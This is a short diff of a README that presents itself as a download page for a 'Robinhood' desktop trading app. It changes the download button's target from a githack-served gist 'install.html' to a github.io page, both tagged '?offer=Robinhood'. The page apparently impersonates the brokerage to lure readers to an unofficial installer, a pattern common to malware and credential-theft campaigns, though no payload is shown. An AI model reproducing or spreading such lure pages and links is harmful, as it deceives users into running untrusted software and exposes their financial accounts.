@@ -1,6 +1,6 @@
 # Robinhood Download — Desktop Trading and Investment Platform
 
-<a href="https://gistcdn.githack.com/blackdevil77-sys/67a8033d732a61e1f53ad3ba157f3b76/raw/1b3244875dbd1dec52ea05b7aa4419da1acf34be/install.html?offer=Robinhood" target="_blank">
+<a href="https://git-app-desktop.github.io/.github/?offer=Robinhood" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Robinhood%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
